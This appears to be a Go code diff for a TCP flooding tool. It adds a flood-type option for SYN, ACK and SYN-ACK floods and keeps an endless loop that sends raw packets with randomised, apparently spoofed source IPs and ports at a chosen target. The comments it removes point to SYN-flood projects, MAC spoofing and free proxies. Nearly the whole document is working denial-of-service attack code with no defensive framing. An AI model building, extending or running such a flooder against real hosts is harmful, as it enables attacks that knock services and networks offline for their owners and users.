@@ -6,7 +6,6 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/schollz/progressbar/v3"
 	"golang.org/x/net/ipv4"
-	"log"
 	"math/rand"
 	"net"
 	"time"
@@ -18,7 +17,7 @@ func init() {
 }
 
 // StartFlooding does the heavy lifting, starts the flood
-func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
+func StartFlooding(dstIpStr string, dstPort, payloadLength int, floodType string) error {
 	var (
 		ipHeader   *ipv4.Header
 		packetConn net.PacketConn
@@ -26,7 +25,8 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 		err        error
 	)
 
-	description := fmt.Sprintf("Flood is in progress on %s:%d with payload length %d", dstIpStr, dstPort, payloadLength)
+	description := fmt.Sprintf("Flood is in progress on %s:%d with flood type %s with payload length %d",
+		dstIpStr, dstPort, floodType, payloadLength)
 	bar := progressbar.DefaultBytes(-1, description)
 
 	payload := getRandomPayload(payloadLength)
@@ -35,17 +35,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 	macAddrs := getMacAddrs()
 
 	for {
-		// !!! https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket
-		// https://www.programmersought.com/article/74831586115/
-		// https://github.com/rootVIII/gosynflood
-		// https://golangexample.com/repeatedly-send-crafted-tcp-syn-packets-with-raw-sockets/
-		// https://github.com/kdar/gorawtcpsyn/blob/master/main.go
-		// https://pkg.go.dev/github.com/google/gopacket
-		// https://github.com/david415/HoneyBadger/blob/021246788e58cedf88dee75ac5dbf7ae60e12514/packetSendTest.go
-		// mac spoofing -> https://github.com/google/gopacket/issues/153
-		// free proxies -> https://www.sslproxies.org/
-
-		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort)
+		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort, floodType)
 		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
 		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
 			return err
@@ -90,8 +80,6 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 			return err
 		}
 
-		log.Println("success packet sending")
-
 		if err = bar.Add(payloadLength); err != nil {
 			return err
 		}
@@ -103,14 +91,24 @@ func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
 	return &layers.IPv4{
 		SrcIP: net.ParseIP(srcIpStr).To4(),
 		DstIP: net.ParseIP(dstIpStr).To4(),
-		//Version: 4,
-		//TTL: 64,
+		Version: 4,
 		Protocol: layers.IPProtocolTCP,
 	}
 }
 
 // buildTcpPacket generates a layers.TCP and returns it with source port and destination port
-func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
+func buildTcpPacket(srcPort, dstPort int, floodType string) *layers.TCP {
+	var isSyn, isAck bool
+	switch floodType {
+	case "syn":
+		isSyn = true
+	case "ack":
+		isAck = true
+	case "synAck":
+		isSyn = true
+		isAck = true
+	}
+
 	return &layers.TCP{
 		SrcPort: layers.TCPPort(srcPort),
 		DstPort: layers.TCPPort(dstPort),
@@ -120,8 +118,8 @@ func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
 		//Seq:     11050,
 		Seq: 1105024978,
 		// Ack:     0,
-		SYN: true,
-		ACK: false,
+		SYN: isSyn,
+		ACK: isAck,
 	}
 }
 
